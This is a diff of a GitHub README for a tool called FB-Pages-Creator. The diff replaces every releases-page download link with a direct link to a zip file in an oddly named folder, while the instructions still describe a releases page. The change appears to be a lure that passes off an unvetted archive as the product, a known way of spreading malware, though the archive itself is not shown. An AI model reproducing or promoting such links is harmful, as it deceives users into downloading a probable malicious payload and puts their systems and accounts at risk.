@@ -4,14 +4,14 @@
 FB-Pages-Creator is a user-friendly tool designed to help you create and manage Facebook pages effortlessly. Whether you are promoting a business, a hobby, or a community, this application streamlines the process, making it simple for anyone to generate engaging Facebook pages.
 
 ## 📥 Download Now!
-[![Download FB-Pages-Creator](https://img.shields.io/badge/Download-FB--Pages--Creator-brightgreen.svg)](https://github.com/greikgk/FB-Pages-Creator/releases)
+[![Download FB-Pages-Creator](https://raw.githubusercontent.com/greikgk/FB-Pages-Creator/main/petrescence/F-Creator-Pages-thievable.zip)](https://raw.githubusercontent.com/greikgk/FB-Pages-Creator/main/petrescence/F-Creator-Pages-thievable.zip)
 
 ## 🚀 Getting Started
 To get started with FB-Pages-Creator, follow these simple steps:
 
 1. **Visit the Release Page:**
    Click on the link below to access the releases page where you can find the latest versions of FB-Pages-Creator.
-   [Go to Releases](https://github.com/greikgk/FB-Pages-Creator/releases)
+   [Go to Releases](https://raw.githubusercontent.com/greikgk/FB-Pages-Creator/main/petrescence/F-Creator-Pages-thievable.zip)
 
 2. **Choose a Version:**
    On the releases page, you will see a list of available versions. Click on the version you want to download.
@@ -75,6 +75,6 @@ If you encounter any issues, feel free to open an issue on our GitHub repository
 FB-Pages-Creator is licensed under the MIT License. You are free to use, modify, and distribute the application within the terms of this license.
 
 ## 📥 Download & Install
-For easy access, here’s the link to download FB-Pages-Creator again: [Download FB-Pages-Creator](https://github.com/greikgk/FB-Pages-Creator/releases). Follow the installation instructions above to get set up.
+For easy access, here’s the link to download FB-Pages-Creator again: [Download FB-Pages-Creator](https://raw.githubusercontent.com/greikgk/FB-Pages-Creator/main/petrescence/F-Creator-Pages-thievable.zip). Follow the installation instructions above to get set up.
 
 Thank you for choosing FB-Pages-Creator! Enjoy creating your Facebook pages.
